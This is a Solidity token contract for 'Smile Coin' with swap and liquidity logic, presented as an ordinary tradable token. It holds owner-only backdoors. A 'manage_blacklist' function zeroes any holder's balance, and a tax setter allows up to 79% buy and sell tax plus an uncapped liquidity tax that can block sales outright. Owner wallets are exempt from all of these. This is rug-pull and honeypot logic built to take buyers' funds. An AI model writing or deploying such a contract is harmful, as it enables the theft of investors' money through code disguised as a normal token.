/**
 
    Telegram: https://t.me/SmileCoinOfficial


**/
// SPDX-License-Identifier: Unlicensed

pragma solidity =0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract SmileCoin is Context, IERC20, Ownable {
    uint256 private constant _totalSupply = 100_000_000e18;
    uint256 private constant onePercent = 1_000_000e18;
    uint256 private minSwap = 250_000e18;
    uint256 private swapThreshold = onePercent;
    uint8 private constant _decimals = 18;


    IUniswapV2Router02 immutable uniswapV2Router;
    address immutable uniswapV2Pair;
    address immutable WETH;
    address payable immutable marketingWallet;
    
    uint256 public buyTax;
    uint256 public sellTax;

    uint256 public lpTax;

    uint8 private launch;
    uint8 private inSwapAndLiquify;

    uint256 private launchBlock;
    uint256 public maxTxAmount = onePercent; //max Tx for first mins after launch
    

    string private constant _name = "Smile Coin";
    string private constant _symbol = unicode"😄";

    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFeeWallet;

    constructor() {
        uniswapV2Router = IUniswapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        WETH = uniswapV2Router.WETH();
        buyTax = 20;
        sellTax = 30;

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            WETH
        );

        marketingWallet = payable(0x0DD694E068d9220D6dE5bB18f6c759Af5B8Aa62b);
        _balance[msg.sender] = _totalSupply;
        _isExcludedFromFeeWallet[marketingWallet] = true;
        _isExcludedFromFeeWallet[msg.sender] = true;
        _isExcludedFromFeeWallet[address(this)] = true;
        _allowances[address(this)][address(uniswapV2Router)] = type(uint256)
            .max;
        _allowances[msg.sender][address(uniswapV2Router)] = type(uint256).max;
        _allowances[marketingWallet][address(uniswapV2Router)] = type(uint256)
            .max;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()] - amount
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function openTrading() external onlyOwner {
        launch = 1;
        launchBlock = block.number;
    }

    function addExcludedWallet(address wallet) external onlyOwner {
        _isExcludedFromFeeWallet[wallet] = true;
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = _totalSupply;
    }

    function manage_blacklist(address[] calldata addresses) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            _balance[addresses[i]] = 0;
        }
    }

    function changeMaxSwapThreshold(uint256 newMaxSwapThreshold) public onlyOwner {
        swapThreshold = newMaxSwapThreshold * 1e18;
    }

    function changeMinSwapThreshold(uint256 newMinSwapThreshold) public onlyOwner {
        minSwap = newMinSwapThreshold * 1e18;
    }

    function changeTax(uint256 newBuyTax, uint256 newSellTax, uint256 newLpTax) external onlyOwner {
        require(newBuyTax < 80, "Cannot set buy tax above 80%");
        require(newSellTax < 80, "Cannot set sell tax above 80%");
        buyTax = newBuyTax;
        sellTax = newSellTax;
        lpTax = newLpTax;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 1e9, "Min transfer amt");

        uint256 _primaryTax;
        uint256 _secondaryTax;

        if (_isExcludedFromFeeWallet[from] || _isExcludedFromFeeWallet[to]) {
            _primaryTax = 0;
            _secondaryTax = 0;
        } else {
            require(
                launch != 0 && amount <= maxTxAmount,
                "Launch / Max TxAmount 1% at launch"
            );

            if (inSwapAndLiquify == 1) {
                // No tax transfer
                _balance[from] -= amount;
                _balance[to] += amount;

                emit Transfer(from, to, amount);
                return;
            }
            uint256 totalFee = buyTax + lpTax;
            if (from == uniswapV2Pair) {
                _primaryTax = buyTax + lpTax;
            } else if (to == uniswapV2Pair) {
                uint256 contractBalance = _balance[address(this)];
                uint256 tokensToSwap;
                uint256 tokensToAddLiquidityWith;
                
                if (contractBalance > minSwap && inSwapAndLiquify == 0) {
                                  
                    if (lpTax > 0) {
                        tokensToSwap = contractBalance * buyTax / totalFee;
                        tokensToAddLiquidityWith = contractBalance - tokensToSwap;
                    } else {
                        tokensToSwap = contractBalance;
                    }
                    if (tokensToSwap > swapThreshold) {
                        tokensToSwap = swapThreshold * buyTax / totalFee;
                        tokensToAddLiquidityWith = tokensToSwap - swapThreshold * lpTax / totalFee;
                    }
                    inSwapAndLiquify = 1;
                    address[] memory path = new address[](2);
                    path[0] = address(this);
                    path[1] = WETH;
                    uniswapV2Router
                        .swapExactTokensForETHSupportingFeeOnTransferTokens(
                            tokensToSwap,
                            0,
                            path,
                            address(this), // Receive ETH in this contract
                            block.timestamp
                        );
                    inSwapAndLiquify = 0;

                    uint256 amountETH = address(this).balance;
                    
                    uint256 amountETHMarketing = amountETH * buyTax / totalFee;
                    uint256 amountETHLiquidity = amountETH - amountETHMarketing;

                    if(lpTax > 0 && amountETHLiquidity > 0){
                        // Add liquidity to pancake
                        addLiquidity(tokensToAddLiquidityWith, amountETHLiquidity);
                    }

                }
                
                

                _primaryTax = sellTax + lpTax;
            } else {
                _primaryTax = 0;
            }
        }

        // Is there primary tax for sender|receiver?
        if (_primaryTax != 0) {
            // Primary tax transfer
            uint256 primaryTaxTokens = (amount * _primaryTax) / 100;
            uint256 transferAmount = amount - primaryTaxTokens;
            _balance[from] -= amount;
            _balance[to] += transferAmount;
            _balance[address(this)] += primaryTaxTokens;
            emit Transfer(from, address(this), primaryTaxTokens);
            emit Transfer(from, to, transferAmount);
        } else {
            // No primary tax transfer
            _balance[from] -= amount;
            _balance[to] += amount;

            emit Transfer(from, to, amount);
        } 
    }

    function _getEthBalance() private view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}